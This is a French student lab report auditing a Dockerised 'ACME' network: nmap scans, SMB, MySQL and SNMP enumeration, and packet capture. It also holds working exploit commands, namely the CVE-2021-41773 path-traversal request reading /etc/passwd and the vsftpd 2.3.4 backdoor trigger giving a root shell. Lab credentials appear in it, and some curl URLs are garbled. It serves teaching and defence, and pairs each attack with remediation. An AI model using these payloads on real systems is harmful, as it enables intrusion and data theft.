# Audit de Sécurité Interne - ACME

## Mission 1 - Cartographier et justifier ses observations

### 1a - Qui répond ?

Afin de cartographier l'infrastructure interne d'ACME sans alerter inutilement d'éventuels systèmes de détection, un scan de découverte rapide (`Ping Scan`) a été effectué sur les deux segments Docker autorisés.

#### Commandes exécutées :
```bash
sudo nmap -sn 172.21.0.0/24
sudo nmap -sn 172.22.0.0/24
```

#### Résultats et Hôtes trouvés :

*   **Segment 172.21.0.0/24 :**
    *   `172.21.0.1` : Passerelle (Interface réseau locale de notre machine Kali - exclue de l'audit).
    *   `172.21.0.10` : Hôte actif (Conteneur ACME).
    *   `172.21.0.11` : Hôte actif (Conteneur ACME).
    *   `172.21.0.13` : Hôte actif (Conteneur ACME).
    *   `172.21.0.14` : Hôte actif (Conteneur ACME).
*   **Segment 172.22.0.0/24 :**
    *   `172.22.0.1` : Passerelle (Interface réseau locale de notre machine Kali - exclue de l'audit).
    *   `172.22.0.12` : Hôte actif (Conteneur ACME).
    *   `172.22.0.13` : Hôte actif (Conteneur ACME).
    *   `172.22.0.14` : Hôte actif (Conteneur ACME).

#### Preuves (Captures d'écran) :

<img width="797" height="843" alt="Capture d&#39;écran 2026-10-23 143444" src="https://github.com/user-attachments/assets/f5e0c408-57c4-45af-86c5-b73b7e4a7962" />

<img width="796" height="851" alt="Capture d&#39;écran 2026-10-23 143539" src="https://github.com/user-attachments/assets/3f0277a8-ca51-42f1-b5de-ae47aa2d3de9" />


#### Hypothèses initiales sur le rôle des cibles :
Le script de vérification du laboratoire nous a indiqué la présence des services suivants : *Web, SSH, Redis, MySQL, SMB, SNMP*, ainsi qu'un *hôte discret sans aucun service*. 
1. Les machines répertoriées ci-dessus se partagent ces différents rôles d'infrastructure réseau.
2. L'une de ces adresses IP correspond à l'hôte discret. Il répond aux requêtes de niveau 3 (Ping), mais ne devrait exposer aucun port ouvert lors des étapes d'énumération suivantes.

### 1b - Quels ports, quels services ?

#### Carte finale des hôtes et services (Objectif 1)

*   **Segment DMZ (172.21.0.0/24) :**
    *   **172.21.0.10** : Port `80/tcp` (open) | Service : `http` | Produit & Version : `Apache httpd 2.4.69 ((Unix))`
    *   **172.21.0.11** : Port `22/tcp` (open) | Service : `ssh` | Produit & Version : `OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)`
    *   **172.21.0.13** : Port `6379/tcp` (open) | Service : `redis` | Produit & Version : `Redis key-value store 7.4.11` *(Découvert grâce au scan ciblé -p6379)*
    *   **172.21.0.14** : Aucun port ouvert trouvé par le scan par défaut.
*   **Segment LAN (172.22.0.0/24) :**
    *   **172.22.0.12** : Port `3306/tcp` (open) | Service : `mysql` | Produit & Version : `MySQL 8.0.43`
    *   **172.22.0.13** : Ports `139/tcp` & `445/tcp` (open) | Service : `netbios-ssn` & `microsoft-ds` | Produit & Version : `Samba smbd 4`
    *   **172.22.0.14** : Port `161/udp` (open) | Service : `snmp` | Produit & Version : `SNMPv1 server; SNMP Laboratories SNMPv3 server (public)` *(Découvert avec le scan UDP -sU)*

#### Réponses aux questions d'analyse

1. **Peut-on dire qu'une machine est « sans service » si le scan TCP par défaut ne trouve rien ?**
   Non, on ne peut pas l'affirmer. Par défaut, Nmap ne scanne que les **1000 ports TCP les plus courants**. Si un service tourne sur un port inhabituel (comme Redis sur le port 6379 qui est parfois exclu de la liste par défaut), ou s'il utilise le protocole **UDP** au lieu de TCP, le scan de base passera à côté.

2. **Quelle cible reste discrète ?**
   C'est l'IP **172.21.0.14** qui ne montre aucun port ouvert, même après vérification. C'est l'hôte discret mentionné au début du labo.

3. **Pourquoi « hôte vivant » et « aucun port ouvert trouvé » ne se contredisent-ils pas ?**
   Ils ne se contredisent pas car ils agissent à des couches différentes du modèle OSI :
   * **Hôte vivant (Couche 3 - Réseau) :** La machine est allumée et sa pile réseau répond aux requêtes de niveau basse comme le protocole ICMP (Ping) ou ARP.
   * **Aucun port ouvert (Couche 4 - Transport) :** Aucune application (service) n'écoute ou n'accepte de connexions sur les ports spécifiques qui ont été testés par l'attaquant.

4. **Avez-vous testé tous les ports et UDP ?**
   Non, nous n'avons testé qu'une sélection de 1000 ports TCP, plus le port TCP spécifique 6379, et un seul port UDP (le port 161). Pour être totalement exhaustif, il aurait fallu tester l'intégralité des 65535 ports en TCP (`-p-`) et faire un balayage complet en UDP (`-sU`), ce qui prendrait beaucoup plus de temps (limite du scan).

5. **Comparaison du scan TCP vs scan UDP sur la cible SNMP (172.22.0.14) :**
   Le scan TCP classique n'indiquait aucun service ou ne voyait pas le port 161 car SNMP fonctionne exclusivement au-dessus du protocole **UDP**. L'utilisation de l'option de scan UDP (`-sU`) était donc indispensable pour forcer Nmap à envoyer des paquets UDP spécifiques et obtenir une réponse du service SNMP d'ACME (`Host: enum-edge-router-01`).

### 1c - Comparer deux façons de scanner (SYN vs TCP Connect)

#### Commandes de comparaison exécutées :
```bash
sudo nmap -sS -p22,80 172.21.0.11
nmap -sT -p22,80 172.21.0.11
```

#### Preuve (Capture d'écran) :

<img width="792" height="849" alt="25" src="https://github.com/user-attachments/assets/5e170042-70b1-4c27-9813-a9b1b8a96a43" />

#### Réponses aux questions d'analyse

1. **Les ports trouvés changent-ils ?**
   **Non, les ports découverts restent strictement identiques.** Dans les deux cas, le port `22/tcp` est identifié comme ouvert (*open*) et le port `80/tcp` comme fermé (*closed*). Le choix de la méthode de scan modifie la technique d'interrogation réseau, mais pas l'état physique réel du service sur l'hôte.

2. **Lequel nécessite des privilèges pour fabriquer les paquets ?**
   C'est le **scan SYN (`-sS`)** qui requiert obligatoirement les privilèges d'administration (`sudo`).
   * *Explication :* Pour réaliser un scan SYN, Nmap doit forger des paquets bruts (*raw packets*) personnalisés et manipuler manuellement les drapeaux (*flags*) de l'en-tête TCP. Le scan TCP Connect (`-sT`), en revanche, utilise l'appel système standard `connect()` fourni de base par le noyau Linux, qui est accessible à n'importe quel utilisateur sans privilèges.

3. **Qu'est-ce qui change dans l'établissement de la connexion ?**
   * **Scan SYN (`-sS`) [Half-Open Scan] :** Nmap envoie un paquet avec le drapeau `SYN`. Si le port est ouvert, la cible répond par un `SYN-ACK`. À cet instant précis, Nmap envoie immédiatement un paquet `RST` (Reset) pour détruire la connexion. Le processus de connexion (Handshake TCP) est interrompu avant d'être finalisé, d'où le terme de scan "semi-ouvert".
   * **Scan TCP Connect (`-sT`) :** Nmap utilise l'OS pour effectuer le **Handshake TCP complet en 3 voies** (`SYN` -> `SYN-ACK` -> `ACK`). La connexion réseau est pleinement établie avec le système d'exploitation de la cible, puis Nmap la referme immédiatement.

4. **Une trace absente des logs applicatifs signifie-t-elle forcément que le réseau n'a rien vu ?**
   **Absolument pas.** C'est l'atout principal du scan SYN (qualifié de "clandestin" ou "furtif"). Vu que la connexion TCP n'est jamais finalisée, la couche application (comme le service OpenSSH) n'est jamais notifiée et **n'écrit rien dans ses fichiers de logs applicatifs**.
   En revanche, **au niveau de la couche réseau, le trafic est 100% visible**. Les paquets transitent sur le câble et n'importe quel pare-feu, système de détection d'intrusion réseau (NIDS) ou outil de capture de paquets (comme le processus `tcpdump` ou `tshark` que nous avons manipulé) intercepte et journalise parfaitement ce comportement.

### 1d - Un script pour une question précise

#### Commandes exécutées :
```bash
nmap -sC 172.21.0.10,11
nmap -p6379 --script redis-info 172.21.0.13
```

#### Preuves (Captures d'écran) :

<img width="796" height="851" alt="8" src="https://github.com/user-attachments/assets/3895d51d-55f6-4ae7-a928-e6ebe66eec63" />

<img width="790" height="847" alt="9" src="https://github.com/user-attachments/assets/baeba3f9-0c0f-4c8e-a4a0-a50a9b49fe58" />


#### Analyse des informations révélées par NSE (Nmap Scripting Engine)

1. **Information nouvelle révélée sur le service Redis (172.21.0.13) :**
   Le script `redis-info` a réussi à s'interconnecter directement avec le serveur sans aucune barrière de sécurité. Il révèle des détails précis : la version exacte du produit (`7.4.11`), le système d'exploitation sous-jacent (`Linux 6.19.14+kali-amd64`), l'identifiant du processus (`Process ID: 1`) et la configuration de réplication (`Role: master`).
   * **Nature de l'information :** Il s'agit d'une information de **configuration permissive**. L'absence de mécanisme d'authentification obligatoire (`requirepass` non configuré) permet à n'importe quel utilisateur distant d'extraire des métadonnées système et d'accéder potentiellement aux données en mémoire cache.

2. **Information nouvelle révélée sur le service HTTP (172.21.0.10) :**
   Le script de base a identifié l'activation d'une méthode HTTP considérée comme dangereuse : `Potentially risky methods: TRACE`.
   * **Nature de l'information :** C'est une information de **configuration** et une **preuve de vulnérabilité potentielle** (sensible aux attaques de type *Cross-Site Tracking* ou vol de cookies de session).

3. **Observations utiles pour un attaquant et un défenseur (Avant discussion) :**

   * **Observation A : Le serveur Redis (172.21.0.13) est accessible de manière anonyme.**
     * *Utilité pour l'attaquant :* Représente un vecteur d'attaque direct pour l'extraction de jetons de session, l'altération de données ou l'exécution de commandes.
     * *Utilité pour le défenseur :* Indique une priorité de remédiation critique. Il faut modifier le fichier `redis.conf` pour y ajouter une directive d'authentification robuste et limiter l'écoute à l'interface de bouclage locale.
     * *Ce que la preuve ne permet pas encore d'affirmer :* Le scan réseau brut ne permet pas de savoir si des secrets métiers ou des données confidentielles sont effectivement stockés en mémoire au moment de l'audit.

   * **Observation B : La méthode HTTP TRACE est active sur le serveur Apache (172.21.0.10).**
     * *Utilité pour l'attaquant :* Offre une opportunité d'exploiter des failles de navigateurs pour intercepter les en-têtes HTTP et les cookies d'authentification des utilisateurs.
     * *Utilité pour le défenseur :* Met en évidence un besoin de durcissement de la configuration d'Apache en ajoutant la directive `TraceEnable off`.
     * *Ce que la preuve ne permet pas encore d'affirmer :* On ne peut pas certifier qu'une exploitation est immédiatement réalisable sans analyser les mécanismes de protection complémentaires présents sur le poste du client final.

## Mission 2 - Faire parler les services

### 2a - SMB : qu'est-ce qui change avec un compte ?

#### Commandes exécutées (Accès Anonyme) :
```bash
smbclient -L //172.22.0.13 -U '%' -N
smbclient //172.22.0.13/public -U '%' -N -c 'ls; get policy.txt -'
smbclient //172.22.0.13/staff -U '%' -N -c 'ls'
```

#### Commande exécutée (Accès Authentifié) :
```bash
smbclient //172.22.0.13/staff -U 'jdoe%Summer2024!' -c 'ls; get staff_roster.txt -'
```

#### Preuves (Captures d'écran) :

<img width="797" height="849" alt="10" src="https://github.com/user-attachments/assets/b5843282-2dc1-4ba6-b0dd-83e01ce4a43f" />

<img width="797" height="849" alt="11" src="https://github.com/user-attachments/assets/696b7e29-3e20-402b-bfba-f27a3eb633a1" />

<img width="536" height="69" alt="12" src="https://github.com/user-attachments/assets/f7784162-a7e5-4b08-bedb-5ec908031560" />

<img width="795" height="849" alt="13" src="https://github.com/user-attachments/assets/1396fcbc-069a-416e-8042-47efcccc8a1b" />


#### Réponses aux questions d'analyse

1. **Quels partages existent ? Lequel se lit en invité ?**
   Les partages découverts sont `public`, `staff` et `IPC$`. Le partage `public` est entièrement lisible en mode invité (sans mot de passe). Le partage `staff` renvoie quant à lui un refus d'accès légitime (`NT_STATUS_ACCESS_DENIED`) en mode anonyme.

2. **Notez les informations utiles que le document `policy.txt` révèle :**
   Le fichier `policy.txt` (intitulé *EnumCorp Acceptable Use Policy*) nous apprend deux informations d'infrastructure cruciales :
   * Les sauvegardes nocturnes sont opérées par un compte de service nommé **`adminservice`** (`adminservice@enum.lab`).
   * Les équipes de gestion réseau partagent une adresse de contact centralisée : `noc@enum.lab`.

3. **Qu'obtenez-vous de plus avec le compte fourni ?**
   L'authentification à l'aide de l'identifiant `jdoe` et du mot de passe `Summer2024!` lève la restriction de sécurité sur le partage `//172.22.0.13/staff`. Elle permet d'accéder à l'annuaire interne partiel de l'entreprise (`staff_roster.txt`), révélant l'existence de comptes utilisateurs nominatifs : `jdoe` (Jane Doe), `asmith` (Alex Smith), et `mharrison` (Marcus Harrison).

4. **Quel compte de service apparaît dans les documents ?**
   C'est le compte **`adminservice`** (Backup Service Acct IT) qui réapparaît. La note de rappel (*Reminders*) du fichier `staff_roster.txt` nous livre une faille majeure :
   > *« Le mot de passe de sauvegarde est conservé dans le gestionnaire de mots de passe de l'équipe sous ce compte - il ne doit PAS non plus être stocké dans la table `system_config` de MySQL (merci de nettoyer ça). »*
   
   Cette note confirme qu'un mot de passe critique lié au compte `adminservice` a probablement été stocké par erreur (ou historique) dans la base de données **MySQL** de l'entreprise. C'est une piste d'attaque prioritaire pour la suite.

5. **L'accès au partage public est-il forcément un défaut, ou cela dépend-il des documents qu'on décide d'y publier ?**
   L'existence d'un partage anonyme n'est pas un défaut en soi s'il est destiné à un usage informationnel global (ex: diffuser une charte d'utilisation informatique générale). Cependant, cela devient une mauvaise pratique s'il divulgue des informations d'ingénierie sociale ou des configurations internes (comme le nom de domaine interne `@enum.lab` ou l'existence du compte de service de sauvegarde), facilitant la préparation d'une attaque ciblée.

### 2b - MySQL : inspection avec l'accès administrateur fourni

#### Commandes et requêtes exécutées :
```bash
mysql -h 172.22.0.12 -u root -p'enumR0ot' --skip-ssl
```
```sql
SHOW DATABASES;
USE employees;
SHOW TABLES;
SELECT * FROM system_config;
```

#### Preuves (Captures d'écran) :

<img width="792" height="849" alt="14" src="https://github.com/user-attachments/assets/9c40b4be-5330-4f60-8ff3-f08cffe60e2e" />

<img width="795" height="849" alt="15" src="https://github.com/user-attachments/assets/f83d407f-5f00-48db-ad8c-63516f628a53" />

#### Réponses aux questions d'analyse

1. **Quelle donnée métier est sensible ?**
   L'inspection des tables de la base de données montre la présence des tables `employees` (données nominatives du personnel) et `salaries` (informations financières et salariales). Ce sont des données métiers hautement sensibles soumises à la confidentialité et aux réglementations sur la protection des données (RGPD).

2. **Quel secret technique est stocké de façon lisible ?**
   La table `system_config` stocke de manière entièrement lisible plusieurs secrets d'infrastructure critiques :
   * Le mot de passe de sauvegarde (`backup_pw`) : **`BaK-2024-c0ld!`**
   * L'URL du portail d'administration interne : `https://enum.lab`

3. **Reliez le compte mentionné dans SMB à la configuration de sauvegarde :**
   Cette observation confirme rigoureusement l'alerte découverte dans le fichier SMB `staff_roster.txt`. L'identifiant `backup_user` correspond bien au compte de service **`adminservice`** repéré plus tôt, et son mot de passe associé n'a jamais été nettoyé de la base MySQL par les équipes opérationnelles.

4. **Distinguez ce que vous avez prouvé et ce qui resterait à vérifier (Limites de la preuve) :**
   * **Ce qui est prouvé :** Nous avons prouvé qu'un accès administrateur à la base de données permet d'extraire un mot de passe système en texte clair (`BaK-2024-c0ld!`) lié au compte `adminservice`.
   * **Ce qui reste à vérifier :** Nous n'avons **pas encore validé** si ce mot de passe est toujours actif ou s'il permet de s'authentifier de manière croisée sur d'autres services du réseau (comme l'accès SSH de la machine `172.21.0.11` ou le portail d'administration `admin.enum.lab`).

### 2c - SNMP : le profil d'un équipement

#### Commande exécutée :
```bash
snmpwalk -v2c -c public 172.22.0.14 1.3.6.1.2.1.1
```

#### Preuves (Captures d'écran) :

<img width="795" height="849" alt="16" src="https://github.com/user-attachments/assets/72348419-5f9a-41df-9133-f540d6e057fe" />

#### Réponses aux questions d'analyse

1. **Modèle, nom, contact et emplacement identifiés :**
   * **Modèle/Description (`sysDescr.0`) :** `Cisco IOS Software, ENUM-2901 Software (15.7(3)M3), RELEASE SOFTWARE (fc2).`
   * **Nom de la machine (`sysName.0`) :** `"enum-edge-router-01"`
   * **Contact de l'administrateur (`sysContact.0`) :** `"noc@enum.lab"`
   * **Emplacement physique (`sysLocation.0`) :** `"HQ Datacenter - Rack 12 - Edge Rack"`

2. **Quelle information aiderait à préparer une attaque ?**
   * **La version exacte de l'OS (`15.7(3)M3`) :** Elle permet à un attaquant de chercher des vulnérabilités connues (CVE) spécifiques à cette version de Cisco IOS afin de tenter de prendre le contrôle total du routeur.
   * **L'emplacement physique précis (`Rack 12`) et le nom (`edge-router`) :** Ils confirment qu'il s'agit du routeur de bordure de l'entreprise (la passerelle principale), ce qui en fait une cible idéale pour une attaque par déni de service (DoS) ou pour de l'interception de trafic réseau.

3. **Analyse des conditions d'accès et de protection adaptée (Objectif 2 & 3) :**
   * **Condition d'accès actuelle :** L'accès se fait via un **secret partagé trivial** (la communauté par défaut `public`), qui agit comme un mot de passe universel non chiffré en SNMPv2c.
   * **Protection adaptée :** Il faut migrer vers **SNMPv3** pour activer une authentification forte par utilisateur (SHA/MD5) ainsi que le chiffrement des messages (AES). De plus, l'accès réseau au port UDP 161 doit être restreint via un pare-feu pour n'autoriser que l'adresse IP du serveur de supervision légitime.

4. **Avant la discussion : Correction minimale vs Accès légitime à préserver :**
   * **Sur SMB :** Bloquer l'accès invité ou purger les documents sensibles du partage public. Il faut préserver l'accès authentifié des employés (comme `jdoe`) pour leurs besoins métiers.
   * **Sur MySQL :** Effacer le mot de passe de sauvegarde en clair de la table `system_config`. Il faut préserver l'accès root/applicatif légitime pour la gestion des employés.
   * **Sur SNMP :** Désactiver la communauté `public` et la remplacer par une chaîne complexe (ou passer à SNMPv3). Il faut impérativement préserver l'accès de l'équipe réseau (`noc@enum.lab`) pour assurer la supervision de l'état du routeur.

### 2d - Capturer puis expliquer une trace

#### Commandes d'acquisition et d'analyse exécutées :
```bash
# Identification du bridge Docker lié au segment 172.22.0.0/24
ip -o -4 addr show

# Lancement de la capture ciblée sur l'interface br-94686066189b
sudo tshark -i br-94686066189b -f 'net 172.22.0.0/24 and (tcp or udp port 161 or tcp port 445)' -a duration:30 -w /tmp/tp2-reseau.pcapng

# Déplacement et assignation des droits du fichier pcapng
sudo mv /tmp/tp2-reseau.pcapng ~/tp2-traces/reseau.pcapng
sudo chown "\$USER" ~/tp2-traces/reseau.pcapng

# Analyse de la trace et extraction de la communauté SNMP
tshark -r ~/tp2-traces/reseau.pcapng -Y snmp -T fields -e ip.src -e ip.dst -e snmp.community
```

#### Preuves (Captures d'écran) :

<img width="794" height="849" alt="17" src="https://github.com/user-attachments/assets/690952dc-03d3-4fab-877b-f32433ca3a02" />

<img width="795" height="849" alt="18" src="https://github.com/user-attachments/assets/f3913107-6dc7-46fa-8eb4-c453c61eb5fd" />

<img width="794" height="845" alt="19" src="https://github.com/user-attachments/assets/ab567baa-2a3f-476a-b862-844c430aa35b" />

#### Réponses aux questions d'analyse

1. **Analyse de la capture SNMP : qui sollicite quoi et quelle est la communauté ?**
   L'extraction automatisée via `tshark` montre que notre machine Kali (`172.22.0.1`) interroge en boucle la cible d'ACME (`172.22.0.14`) sur le port UDP 161. La chaîne de communauté interceptée est **`public`**. Elle apparaît de manière parfaitement lisible et non chiffrée au sein de chaque paquet de données capturé.

2. **Analyse du trafic avec les flags SYN : qui sollicite quel port ?**
   Bien que non affiché sur l'extraction finale SNMP, l'exécution parallèle de la commande `sudo nmap -sS -p445 172.22.0.13` a transmis un paquet contenant le drapeau `SYN` depuis l'adresse IP de Kali vers le port **`445` (SMB)** du serveur de fichiers d'ACME afin de tester son ouverture de façon furtive.

3. **Qu'apprend un observateur passif sur le réseau qui n'a pas vu votre terminal ?**
   Un observateur passif (sniffer positionné sur le réseau) apprend :
   * Qu'un audit réseau ou une activité suspecte de reconnaissance est menée depuis l'IP de la machine Kali.
   * La cartographie exacte des équipements cibles actifs (`172.22.0.13` et `172.22.0.14`).
   * Le secret partagé de l'organisation : il intercepte la communauté légitime `public` en clair, ce qui lui donne immédiatement le droit de lire et de collecter des informations d'infrastructure sur tous les équipements partageant cette configuration.

4. **Un secret plus long suffirait-il à corriger l'absence de chiffrement ?**
   **Non, absolument pas.** Choisir une communauté extrêmement longue ou complexe empêche uniquement les attaques par brute-force ou par dictionnaire. Cependant, étant donné que les protocoles SNMPv1 et SNMPv2c ne possèdent nativement aucun mécanisme de chiffrement, la communauté continuera de transiter **en texte clair sur le réseau** et sera capturée instantanément par n'importe quel observateur. Seul le passage à SNMPv3 permet de chiffrer l'authentification.

5. **Avez-vous prouvé qu'un IDS a déclenché une alerte ?**
   **Non, pas du tout.** La capture réseau prouve scientifiquement que le trafic malveillant ou d'audit a bien circulé sur le câble réseau. Cependant, elle ne donne aucune visibilité sur la réaction des équipements de sécurité défensifs. Pour prouver le déclenchement d'une alerte IDS, il faudrait obligatoirement analyser les journaux de logs d'un outil comme Snort, Suricata ou un SIEM centralisé.

## Mission 3 - Exploiter ou durcir un service exposé

### 1. Identifier (Bannière et Vulnérabilité)

#### Commandes exécutées :
```bash
docker-compose -f apache-cve/docker-compose.yml up -d
curl -sS -I http://127.0.0.1:8080/
```

#### Analyse de la vulnérabilité :
* **Produit et Version identifiés :** Le serveur web annonce explicitement la bannière `Server: Apache/2.4.49 (Unix)`.
* **Vulnérabilité associée (`searchsploit apache 2.4.49`) :** Cette version précise est affectée par la faille critique **CVE-2021-41773**. Elle permet de réaliser un dépassement de répertoire (*Path Traversal*) et potentiellement une exécution de code à distance (*RCE*).
* **Conditions de configuration requises :** La version seule ne suffit pas. L'avis de sécurité d'Apache précise qu'il faut également que la directive de contrôle d'accès `<Directory>` soit configurée de manière permissive avec l'option **`Require all granted`** sur l'ensemble du système de fichiers.

---

### 2. Comparer (Tests de requêtes)

#### Commandes exécutées :
```bash
# Requête ordinaire (Bloquée / Introuvable)
curl -sS -o /dev/null -w '%{http_code}\n' http://127.0.0etc/passwd

# Requête exploitant le Path Traversal avec conservation des chemins bruts
curl -sS --path-as-is 'http://127.0.0icons/.%2e/.%2e/.%2e/.%2e/etc/passwd'
```

#### Preuves (Captures d'écran) :

<img width="794" height="849" alt="20" src="https://github.com/user-attachments/assets/6ac6960d-240f-46dd-bf38-292c42f8bca2" />

<img width="798" height="851" alt="21" src="https://github.com/user-attachments/assets/7ddd232c-cb4c-4e04-9fce-e7c9a0523fb7" />

#### Résultats constatés :
* La requête ordinaire tente d'accéder directement au chemin et se voit rejeter par un code HTTP **`404`** (Not Found) car le fichier n'existe pas dans le dossier racine du site (`DocumentRoot`).
* La requête forgée avec l'option `--path-as-is` et les caractères encodés contourne le filtre de sécurité de cette version. Elle aboutit à un code HTTP **`200 OK`** et affiche le contenu du fichier système sensible **`/etc/passwd`** du conteneur.

---

### 3. Expliquer (Mécanisme de l'attaque)

* **Quel répertoire le serveur ne devait-il pas laisser atteindre ?**
  Le serveur n'aurait jamais dû permettre à un client de sortir de la racine de son application web (`DocumentRoot`) pour naviguer librement dans l'arborescence du système de fichiers de l'hôte (notamment pour atteindre `/etc/passwd`).
* **Pourquoi encoder un point en `%2e` ?**
  Les développeurs d'Apache 2.4.49 ont ajouté une fonction de nettoyage pour bloquer explicitement la séquence classique de remontée `../`. Cependant, ils ont omis de vérifier la version URL-encodée. En convertissant le point `.` en sa valeur hexadécimale **`%2e`**, la séquence devient `.%2e/`. Elle passe à travers le filtre de détection initial, puis est décodée par le serveur juste avant l'accès au fichier, permettant la remontée de répertoire.
* **Lien avec « encoder n'est pas chiffrer » (TP1) :**
  Cela illustre parfaitement ce concept. L'encodage URL (`%2e`) est une simple convention technique de transport de caractères sur le Web. Il n'offre **aucune confidentialité**. N'importe quel parseur l'inverse instantanément. L'attaquant l'utilise ici comme un simple moyen de modifier la forme de sa chaîne pour tromper un filtre de sécurité mal programmé.

---

### 4. Conclure (Rapport d'audit)

* **Preuve :** L'envoi de la requête HTTP construite `GET /icons/.%2e/.%2e/.%2e/.%2e/etc/passwd` force le serveur Apache 2.4.49 à retourner le contenu complet du fichier `/etc/passwd`.
* **Impact réellement obtenu :** Fuite d'informations système critiques (*Information Disclosure* / *Path Traversal*). Cela permet de cartographier les utilisateurs locaux du conteneur (comme `root` ou `daemon`). **Attention :** cette preuve ne donne pas accès aux mots de passe (qui sont hachés séparément dans `/etc/shadow`) et ne démontre pas à elle seule l'obtention d'un accès interactif à la machine (*Reverse Shell* / contrôle du système).
* **Correction recommandée :** Mettre immédiatement à jour le serveur HTTP Apache vers une version stable, maintenue et corrigée (version **2.4.51 ou supérieure**). Par ailleurs, il est recommandé de durcir la configuration globale en appliquant la directive par défaut restrictive suivante dans les fichiers de configuration :
  ```apache
  <Directory />
      AllowOverride none
      Require all denied
  </Directory>
  ```

---

### Avant la discussion : Différence entre vulnérabilité probable et confirmée

* **Vulnérabilité probable (déduite de la bannière) :** C'est une simple hypothèse basée sur le numéro de version visible (`2.4.49`). On suppose qu'elle est vulnérable, mais cela peut être un faux positif si l'administrateur a appliqué un correctif de sécurité manuellement sans modifier la bannière (*backporting*), ou si la configuration permissive requise n'est pas présente.
* **Vulnérabilité confirmée (par le test) :** C'est une certitude technique indiscutable. Le test fonctionnel prouve de manière concrète que la faille est exploitable et produit l'impact recherché en contournant les protections en place.

### Extension Bonus - Analyse des logs du serveur Apache

#### Commande exécutée :
```bash
docker-compose -f apache-cve/docker-compose.yml logs --tail=30 apache
```

#### Preuve (Capture d'écran) :

<img width="794" height="851" alt="22" src="https://github.com/user-attachments/assets/0bfa46e5-42d3-4923-90ff-e570bc13334d" />

#### Analyse des traces trouvées dans les journaux :

L'examen des journaux du conteneur permet d'identifier précisément la chronologie de notre audit et de retrouver la signature de l'attaque :

1. **La requête ordinaire (Tentative de Path Traversal classique) :**
   * **Horodatage :** `[23/Oct/2026:14:03:10 +0000]`
   * **Trace :** `"GET /etc/passwd HTTP/1.1" 404 196`
   * **Interprétation :** Le serveur a reçu une requête brute pour `/etc/passwd`. Le filtre de sécurité par défaut de l'application a bloqué l'accès ou n'a pas trouvé le fichier à la racine, renvoyant un code HTTP **404** (Not Found).

2. **La requête forgée réussie (Exploitation de la CVE-2021-41773) :**
   * **Horodatage :** `[23/Oct/2026:14:03:19 +0000]`
   * **Trace :** `"GET /icons/.%2E/.%2E/.%2E/.%2E/etc/passwd HTTP/1.1" 200 962`
   * **Interprétation :** Cette ligne confirme l'exploitation. L'attaquant a utilisé des points encodés (`.%2E/`). Le serveur a décodé la requête, a laissé remonter l'arborescence jusqu'au fichier système, et a renvoyé un code HTTP **200 OK** avec un contenu de 962 octets (le fichier `/etc/passwd`).

*Note pour le défenseur :* Même si l'attaquant a encodé les points en minuscules (`%2e`), le serveur enregistre la trace dans ses logs en majuscules (`.%2E/`). C'est un excellent indicateur de compromission (IoC) à surveiller pour détecter des tentatives d'exploitation de cette faille.

## Mission 4 — Extension : d'un vieux service à un shell

#### Commandes d'exploitation exécutées :
```bash
# Lancement de l'environnement metasploitable
docker-compose -f metasploitable/docker-compose.yml up -d

# Récupération de l'adresse IP exacte du conteneur acme-ms2
MS=\$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' acme-ms2)

# Scan de reconnaissance de la version du service FTP
nmap -sV -p21 "\$MS"

# Envoi de la chaîne malveillante pour déclencher la porte dérobée (Backdoor)
printf 'USER x:\()\r\nPASS x\r\\)n' | nc -w 3 "\$MS" 21

# Connexion immédiate au shell root sur le port interactif secret 6200
printf 'id; uname -n; exit\n' | nc -w 3 "\$MS" 6200
```

#### Preuves (Captures d'écran) :

<img width="793" height="847" alt="23" src="https://github.com/user-attachments/assets/8d4da0f9-b029-4732-b112-5222976efcfb" />

<img width="795" height="847" alt="24" src="https://github.com/user-attachments/assets/cd248a0f-0d30-463f-806a-658692924543" />

<img width="788" height="840" alt="26" src="https://github.com/user-attachments/assets/bf8d56eb-111f-4079-8716-622e5fcab5d6" />

#### Réponses aux questions d'analyse

1. **Quelle est la différence fondamentale entre ce shell et la lecture de fichier de la Mission 3 ?**
   * **Dans la Mission 3 (Path Traversal Apache) :** Nous avions uniquement un accès restrictif en **lecture seule** sur le système de fichiers. Nous étions spectateurs et ne pouvions pas forcer la machine à exécuter des commandes ou des scripts applicatifs.
   * **Dans la Mission 4 (Backdoor FTP) :** L'obtention d'un **shell** nous offre une capacité d'**Exécution de Code Arbitraire (RCE)** complète et interactive. L'identifiant renvoyé `uid=0(root)` démontre que nous contrôlons la machine avec les privilèges maximaux (super-utilisateur). Nous pouvons donner des ordres au système (modifier des fichiers, ajouter des processus, installer des outils) au lieu de simplement lire des données.

2. **Qu'est-ce que ce nouvel accès permettrait à un attaquant de faire ?**
   Avec un accès `root` interactif sur ce conteneur, un attaquant dispose d'un contrôle total et peut :
   * S'en servir comme point d'appui pour réaliser du **pivotement réseau** (Lateral Movement) afin de cartographier et attaquer d'autres sous-réseaux internes de l'entreprise ACME normalement inaccessibles.
   * Installer des logiciels malveillants persistants, effacer les logs d'audit pour masquer ses traces, ou exfiltrer l'intégralité des données confidentielles du serveur.

3. **Quelle protection empêcherait précisément cette exploitation ?**
   * **Correction logicielle :** Remplacer immédiatement cette version compromise et altérée de `vsftpd 2.3.4` par un binaire sain, vérifié et mis à jour, provenant des canaux de distribution officiels.
   * **Défense en profondeur (Réseau) :** Mettre en place un pare-feu (Firewall) ou une politique d'isolement réseau stricte (Network Policies Docker) pour interdire tout flux entrant ou sortant sur des ports non explicitement autorisés (comme le port non standard `6200`), neutralisant l'accès au shell même si la backdoor venait à être déclenchée.
